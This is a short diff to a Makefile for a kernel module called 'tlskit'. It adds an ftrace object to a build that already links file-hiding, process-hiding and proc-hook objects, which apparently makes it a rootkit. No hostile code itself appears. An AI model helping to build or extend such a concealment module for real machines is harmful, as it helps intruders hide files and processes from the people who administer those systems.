@@ -14,7 +14,8 @@ tlskit-objs += 	$(SRC_DIR)/lkm.o \
 				$(SRC_DIR)/csprng.o \
 				$(SRC_DIR)/file_hiding.o \
 				$(SRC_DIR)/proc_hook.o \
-				$(SRC_DIR)/process_hiding.o
+				$(SRC_DIR)/process_hiding.o \
+				$(SRC_DIR)/ftrace.o
 
 tlskit:
 	echo "Compiling lkm tlskit ..."
